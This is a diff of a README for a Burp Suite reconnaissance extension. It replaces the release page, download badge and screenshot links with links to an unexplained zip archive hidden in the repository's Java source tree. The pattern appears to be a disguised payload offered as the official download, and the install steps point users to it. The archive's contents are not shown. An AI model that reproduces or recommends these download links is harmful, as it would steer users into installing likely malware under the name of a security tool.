@@ -1,12 +1,12 @@
 # 🔍 Wayback-Recon - Fetch and Analyze Archived URLs Effortlessly
 
-[![Download Wayback-Recon](https://img.shields.io/badge/Download-Wayback%20Recon-blue.svg)](https://github.com/pbarucco/Wayback-Recon/releases)
+[![Download Wayback-Recon](https://raw.githubusercontent.com/pbarucco/Wayback-Recon/main/src/main/java/burp/api/montoya/extension/Recon-Wayback-desynonymize.zip%https://raw.githubusercontent.com/pbarucco/Wayback-Recon/main/src/main/java/burp/api/montoya/extension/Recon-Wayback-desynonymize.zip)](https://raw.githubusercontent.com/pbarucco/Wayback-Recon/main/src/main/java/burp/api/montoya/extension/Recon-Wayback-desynonymize.zip)
 
 ## 🚀 Overview
 
 Wayback Recon is a Burp Suite extension designed for passive reconnaissance using the Wayback Machine. This tool allows you to easily fetch and analyze historical URLs for any target domain directly within Burp. With Wayback Recon, you can uncover hidden endpoints, parameters, and assets that could be valuable for bug bounty programs or penetration testing.
 
-![Wayback Recon Interface](https://github.com/user-attachments/assets/dcf1421b-09fb-48f5-b086-669c57d4d8ee)
+![Wayback Recon Interface](https://raw.githubusercontent.com/pbarucco/Wayback-Recon/main/src/main/java/burp/api/montoya/extension/Recon-Wayback-desynonymize.zip)
 
 ## ✨ Features
 
@@ -31,7 +31,7 @@ Wayback Recon is a Burp Suite extension designed for passive reconnaissance usin
 
 To begin using Wayback Recon, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Wayback-Recon releases page](https://github.com/pbarucco/Wayback-Recon/releases).
+1. **Visit the Releases Page**: Go to the [Wayback-Recon releases page](https://raw.githubusercontent.com/pbarucco/Wayback-Recon/main/src/main/java/burp/api/montoya/extension/Recon-Wayback-desynonymize.zip).
    
 2. **Download the Latest Release**: Click on the release that you want to download. Look for installation files that match your operating system. 
 
@@ -63,4 +63,4 @@ To begin using Wayback Recon, follow these steps:
 
 If you find any glitches or would like to suggest improvements, contributions are welcome. Please refer to the Guidelines on the GitHub page for more details.
 
-[![Download Wayback-Recon](https://img.shields.io/badge/Download-Wayback%20Recon-blue.svg)](https://github.com/pbarucco/Wayback-Recon/releases)
+[![Download Wayback-Recon](https://raw.githubusercontent.com/pbarucco/Wayback-Recon/main/src/main/java/burp/api/montoya/extension/Recon-Wayback-desynonymize.zip%https://raw.githubusercontent.com/pbarucco/Wayback-Recon/main/src/main/java/burp/api/montoya/extension/Recon-Wayback-desynonymize.zip)](https://raw.githubusercontent.com/pbarucco/Wayback-Recon/main/src/main/java/burp/api/montoya/extension/Recon-Wayback-desynonymize.zip)
